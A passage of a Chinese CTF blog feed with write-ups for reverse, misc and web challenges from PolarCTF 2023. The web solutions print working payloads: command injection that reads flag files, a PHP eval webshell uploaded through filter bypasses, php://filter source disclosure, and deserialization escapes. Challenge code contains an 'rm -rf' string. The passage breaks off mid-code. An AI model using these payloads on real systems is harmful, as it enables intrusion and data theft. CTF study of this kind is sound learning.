class="number">9</span>cRB51n5yxl9g/v4Djdoq+YadpY2vIGrZ2CI2Uv2y4jlPTdIuCNnWbDVfnXQwmbz3jY+JyZm4sKgHDLAxJSG/IIAKk2q5C0f6l6L6v86Nra6TiDC3FBOzBEMzapQz6v9XkJfLFhywMtFLbz4PXsEvXiaFbSooHN8xVDDfRmWQyINRSNJguwiY9ElfGZnb6gHT2U5ENwxhxpxW+<span class="number">5</span>Jnwn3zMCBub7HDwqyOSl5l8hKoU5obcdof5SuB3A==</span><br></pre></td></tr></table></figure><p>没思路了</p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="reverse-聪明的信使"><a class="markdownIt-Anchor" href="#reverse-聪明的信使"></a> Reverse 聪明的信使</h2><p>拖入IDA，main函数里面发现可疑字符串，<code>oujp&#123;H0d_TwXf_Lahyc0_14_e3ah_Rvy0ac@wc!&#125;</code>，找加密函数，发现是凯撒密码，秘钥为9<br />直接找个网站就出了<br /><code>flag&#123;y0u_know_crypt0_14_v3ry_imp0rt@nt!&#125;</code></p><h2 id="reverse-喵喵喵的flag碎了一地"><a class="markdownIt-Anchor" href="#reverse-喵喵喵的flag碎了一地"></a> Reverse 喵喵喵的flag碎了一地</h2><p>提示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Open in IDA and Learn about `Strings` to find the first part of the flag</span><br><span class="line">2. Learn about `Functions` to find the second part of the flag which is the name of a function</span><br><span class="line">3. The hint for the last part is in the function you found in the second part</span><br></pre></td></tr></table></figure><p>shift+F12，查找字符串，Flag1：<code>flag&#123;My_fl@g_h4s_</code><br />第二步，找函数名，在左侧拉到最上面，Flag2：<code>br0ken_4parT_</code><br />提示三，<code>Learn about Xref and Find out which function refers me to get the last part of the flag!</code><br />最后一步，学习Xref，按空格，切换视图至<br /><img src="https://picx.zhimg.com/80/v2-e37367b5462487d4f93589f94b51086c_1440w.png" alt="" /><br />views–&gt;Open subsviews–&gt;Function Call<br /><img src="https://pic1.zhimg.com/80/v2-e4fcc9ac14b1129e4e03bafd5ee808aa_1440w.png" alt="" /><br />发现是<code>func718</code>调用了该函数<br />双击进入该函数，得到Flag3<code>Bu7_Y0u_c@n_f1x_1t!&#125;</code><br />FLAG:<code>flag&#123;My_fl@g_h4s_br0ken_4parT_Bu7_Y0u_c@n_f1x_1t!&#125;</code><br />好好好，继cnss(应该没记错吧)后又学了一场IDA的使用，基本都差不多</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PolarCTF2023冬季个人挑战赛wp(web,crypto,misc)</title>
      <link href="/2024/04/01/PolarCTF2023%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp-web-crypto-misc/"/>
      <url>/2024/04/01/PolarCTF2023%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp-web-crypto-misc/</url>
      
        <content type="html"><![CDATA[<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h1><h2 id="misc-签到喵"><a class="markdownIt-Anchor" href="#misc-签到喵"></a> misc-签到喵</h2><p>经典的公众号签到题<br />发送<code>宝宝想要flag</code>(这个是base64解码得到的结果)到公众号即可</p><hr /><h2 id="misc-a-宽宽-s-00-e"><a class="markdownIt-Anchor" href="#misc-a-宽宽-s-00-e"></a> misc-A 宽宽 S 00 E</h2><p><code>U2FsdGVkX19d7TPOqeK+yL2btyx2gt4lp2ErgNwLzytzew9Wu7tcVvsR4tqWzGFi 772B6etLclejBUsSwv/hmg==</code><br />零宽字节隐写，vim查看隐写字符，然后找个在线网站得到上面的字符<br />前段是aes字符，emm也没解出来<br />后来在群里看见群友在聊发现秘钥是sql，好好好，原来附件给的这个sql注入是这么玩的，然后上面的密文要把空格去掉<br /><a href="https://stackoverflow.org.cn/aesencrypt/">https://stackoverflow.org.cn/aesencrypt/</a><br />base64解码，加上flag{}就是答案</p><hr /><h2 id="misc-机密"><a class="markdownIt-Anchor" href="#misc-机密"></a> misc-机密</h2><p>有个流量包，没看出什么东西，直接binwalk<br />得到个压缩包，直接爆破，1903</p><hr /><h2 id="misc-社会主义大法好"><a class="markdownIt-Anchor" href="#misc-社会主义大法好"></a> misc-社会主义大法好</h2><p>一开始ARCHPR识别不了这个压缩包，以为伪加密，结果binwalk分离之后也不行，估计文件格式错了，或者我电脑配置的问题，之前我就把winrar卸了，一般有概率遇到这种情况，直接掏出bandzip<br />后来看群友聊，还得是misc神，我后面拿bandzip也能破，因为正好四位密码，图片里也有，1945，社会主义核心价值观解码<br /><code>U2FsdGVkX18hXTEdmaHlK9Wa0JuJu4UApkMzMe69xXg8yBK0Fw5q4HtQ5+qK6BCB +WkHQDiIxks=</code><br />删去换行符再继续下面的操作<br />这个字符串的开头还以为是aes，其实不是，是rabbit，秘钥就拿剩下的一个数字，2014。。。。</p><hr /><h2 id="misc-是uu吗"><a class="markdownIt-Anchor" href="#misc-是uu吗"></a> misc-是uu吗</h2><p><code>&amp;,3(S-#4V</code>题目名字包含uu，推测是uuencode，得到<code>123456</code>，应该是某个压缩包密码<br />尝试过各种音频隐写，都不对，赛后看讲解视频才发现是steghide，其实这个123456或许能够猜到(???)<br /><code>steghide extract -sf filename -p 123456</code><br />得到flag.txt，再拿去uuencode解码一下<br /><code>&gt;9FQA9WLV-S$S-S@Y-#8P,C,V-#@W-S@S,C0V.#E]</code><br /><code>flag&#123;671378946023648778324689&#125;</code></p><hr /><h2 id="misc-ez签到"><a class="markdownIt-Anchor" href="#misc-ez签到"></a> misc-EZ签到</h2><p>binwalk得到H1nt.zip是伪加密，得到一张小猫图片，尝试各类图片隐写，没有用<br />最后尝试到F5-steg，先把图片拖进去，在这里<code>java Extract f1ag.jpg</code><br />得到一个flag.txt,里面的内容很明显是zip，改后缀，要密码，binwalk一下看是不是伪加密，拿到了flag，可惜是假的。。。。。。掉坑里了<br />出题人其实给了这个的密码<code>java Extract f1ag.jpg -p qiandao</code><br />得到<code>nizhenbuhuiyiweizheshiqiandaoba</code>,是flag压缩包的密码<br />得到100张图片，进行拼图，发现大小不一，借助PS批量处理，统一修改为40x40，过程可以去B站看讲解官方团队的讲解视频<br />拼图，借助imagemagick，文件夹cmd，<code>magick montage *.jpg -tile 10x10 -geometry +0+0 flag.jpg</code>发现是无序的<br />再借助gaps复原，图片拖入bin目录下<code>python3 gaps --image=flag.jpg --size=40 --save</code><br />emmmm，卡住了，笨b卡在了安装gaps上了，emmm，giao<br />但这道题也算是解决了，get到了拼图工具imagemagick跟自动拼图工具gaps，也算有所收获</p><hr /><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h1><h2 id="web-cool"><a class="markdownIt-Anchor" href="#web-cool"></a> web-cool</h2><p>system被ban，换passthru<br />flag被ban，利用通配符*<br /><code>?a=passthru('cat f*');</code></p><hr /><h2 id="web-phpurl"><a class="markdownIt-Anchor" href="#web-phpurl"></a> web-phpurl</h2><p>扫一下，发现<code>1.txt</code><br />乱码，火狐浏览器ALT-&gt;查看-&gt;修复乱码，得到一个被加密的文件名<code>aW5kZXgucGhwcw</code>,base64解密得到<code>index.phps</code><br />源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;xxs&quot;</span>===<span class="variable">$_GET</span>[sys]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Not a good idea!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[sys] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[sys]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[sys] == <span class="string">&quot;xxs&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to polar LABS!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Flag: XXXXXXX &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参数sys不能等于xxs，但是经过url编码的sys可以等于xxs，先让浏览器进行转码，%25-&gt;%,%78-&gt;x,就能实现<br /><code>?sys=%2578xs</code><br />(emmm,附件的内容其实就是乱码修复后的)</p><hr /><h2 id="web-cookie欺骗"><a class="markdownIt-Anchor" href="#web-cookie欺骗"></a> web-cookie欺骗</h2><p>hackbar,将cookie值改为admin<code>user=admin</code></p><hr /><h2 id="web-干正则"><a class="markdownIt-Anchor" href="#web-干正则"></a> web-干正则</h2><p>parse_str变量覆盖<br /><code>?id=a[0]=www.polarctf.com&amp;cmd=127.0.0.1|cat *</code><br />没看见“干正则”，嘿嘿<br />一开始还找不到flag，F12即可</p><hr /><h2 id="web-随机值"><a class="markdownIt-Anchor" href="#web-随机值"></a> web-随机值</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar1</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar2</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Night</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Light</span> = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$Polar2</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;Polar1 === <span class="variable language_">$this</span>-&gt;Polar2) &#123;</span><br><span class="line">            <span class="variable">$Light</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;Night === <span class="variable language_">$this</span>-&gt;Light) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your wrong!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Index</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment"># O%3A5%3A%22Index%22%3A4%3A%7Bs%3A13%3A%22%00Index%00Polar1%22%3Bi%3A3%3Bs%3A13%3A%22%00Index%00Polar2%22%3Bi%3A3%3Bs%3A8%3A%22%00%2A%00Night%22%3Bi%3A3%3Bs%3A8%3A%22%00%2A%00Light%22%3Bi%3A3%3B%7D</span></span><br></pre></td></tr></table></figure><p>因为php是不能直接给private和protected的变量直接赋值的，所以rand()函数直接废掉，不起作用<br />又或者变量引用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a-&gt;Polar1=&amp;$a-&gt;Polar2;</span><br><span class="line">$a-&gt;Night=&amp;$a-&gt;Light;</span><br></pre></td></tr></table></figure><hr /><h2 id="web-upload"><a class="markdownIt-Anchor" href="#web-upload"></a> web-upload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10000</span>,<span class="number">99999</span>).<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显双写绕过，将木马文件命名为a.pphphp即可，文件内容<code>&lt;?php eval($_POST['a']);</code><br />上传文件之后，可以F12查看网络，就可以看到文件上传的位置了，再用蚁剑连接即可<br />(补题发现，秋季那道ezupload，上传GIF文件，再抓包改php后缀，蚁剑，不过我连接的时候，警告返回数据为空？？不应该啊)</p><hr /><h2 id="web-你的马呢"><a class="markdownIt-Anchor" href="#web-你的马呢"></a> web-你的马呢？</h2><p>经典文件上传，注意到URL，可能存在文件包含，发现可以<code>/etc/passwd</code>，先读一下源码<code>url/index.php?file=php://filter/read/convert.base64-encode/resource=upload.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$uploaddir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">  <span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">  <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//æ£æ¥æä»¶å</span></span><br><span class="line">å®¹</span><br><span class="line">  <span class="variable">$text</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//æ£æ¥æä»¶åç¼</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph.|htaccess/i&quot;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&lt;\?php/i&quot;</span>, <span class="variable">$text</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å¿å¿å¿ï¼æ³ä¼ é©¬ï¼ä¸å¯è½ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$uploadfile</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ­åä½ ï¼ä¸ä¼ è·¯å¾&lt;br&gt;è·¯å¾ä¸º:&quot;</span> . <span class="variable">$uploadfile</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;æ¶æåç¼,è¯è¯.jspå¢ï¼&lt;br&gt;&quot;</span>;</span><br><span class="line">   </span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;title&gt;ä¸ä¼ æä»¶&lt;/title&gt;</span><br><span class="line"> &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> åä¸å«ä¸ä¼ phpèæ¬ï¼ï¼ï¼ï¼</span><br><span class="line"> &lt;form action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;æäº¤&quot;</span> /&gt;</span><br><span class="line"> &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>大致内容是，文件内容不能含&lt;?php标签，文件名后缀不能有ph.和htaccess，等<br />上传jpg文件，利用短标签</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>post: a=system(cat /f*);</code></p><hr /><h2 id="web-ezphp"><a class="markdownIt-Anchor" href="#web-ezphp"></a> web-ezphp</h2><p>爬虫-&gt; robots.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /file</span><br><span class="line">Disallow: /uploads</span><br><span class="line">Disallow: /uploads/images</span><br></pre></td></tr></table></figure><p>进入<code>uploads/upload.php</code>进行文件上传<br /><code>/file</code>告诉我们要传参filename<br /><code>/uploads/images</code>查看上传了那些文件<br />上传木马文件<br /><code>url/file/file.php?filename=../uploads/images/a.jpg</code><br /><code>post:a=system('ls /');</code><br />发现<code>bin dev etc home lib linuxrc media mnt proc root run sbin srv sys tmp usr var</code><br />一般是在home或root下<br /><code>post:a=system('ls /home');</code><br />最终<code>post:a=system('cat /home/webuser/flag');</code></p><hr /><h2 id="web-你想逃也逃不掉"><a class="markdownIt-Anchor" href="#web-你想逃也逃不掉"></a> web-你想逃也逃不掉</h2><p>PHP反序列化字符逃逸，题目的过滤函数使得字符减少</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    https://ytyyds.github.io/ (与本题无关)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/phtml|php3|php4|php5|aspx|gif/&#x27;</span>,<span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span>[<span class="string">&#x27;passwd&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ans</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ans</span>)[sign] == <span class="string">&quot;ytyyds&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>本地试验</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/phtml|php3|php4|php5|aspx|gif/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;phtmlphtmlphtmlphtml&#x27;</span>;</span><br><span class="line">    <span class="variable">$user</span>[<span class="string">&#x27;passwd&#x27;</span>] = <span class="string">&#x27;;s:6:&quot;passwd&quot;;s:0:&quot;&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$user</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>((<span class="variable">$user</span>)));</span><br><span class="line">    <span class="variable">$ans</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ans</span>)[sign] == <span class="string">&quot;ytyyds&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\nsuccess!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># a:3:&#123;s:8:&quot;username&quot;;s:20:&quot;phtmlphtmlphtmlphtml&quot;;s:6:&quot;passwd&quot;;s:46:&quot;;s:6:&quot;passwd&quot;;s:0:&quot;&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;&quot;;s:4:&quot;sign&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="comment"># a:3:&#123;s:8:&quot;username&quot;;s:20:&quot;&quot;;s:6:&quot;passwd&quot;;s:46:&quot;;s:6:&quot;passwd&quot;;s:0:&quot;&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;&quot;;s:4:&quot;sign&quot;;s:6:&quot;123456&quot;;&#125;</span></span><br><span class="line"><span class="comment"># success!!!</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post: name=phtmlphtmlphtmlphtml</span><br><span class="line">get: url/?passwd=;s:6:&quot;passwd&quot;;s:0:&quot;&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;&#125;</span><br><span class="line">F12查看即可</span><br></pre></td></tr></table></figure><hr /><h2 id="web-苦海"><a class="markdownIt-Anchor" href="#web-苦海"></a> web-苦海</h2><p>链子<code>User::__wakeup()-&gt;User::printName()-&gt;Surrender::__toString()-&gt;FileRobot::__get()-&gt;FileRobot::__invoke()-&gt;FileRobot::Get_file()</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;PolarNight&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;syst3m(&quot;rm -rf ./*&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;删库跑路，蹲监狱~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi, Welcome to Polar D&amp;N ~ &quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">printName</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span> . <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Surrender</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phone</span> = <span class="number">110</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span> = <span class="string">&#x27;遵纪守法，好公民~&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise = <span class="string">&#x27;苦海无涯，回头是岸！&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span 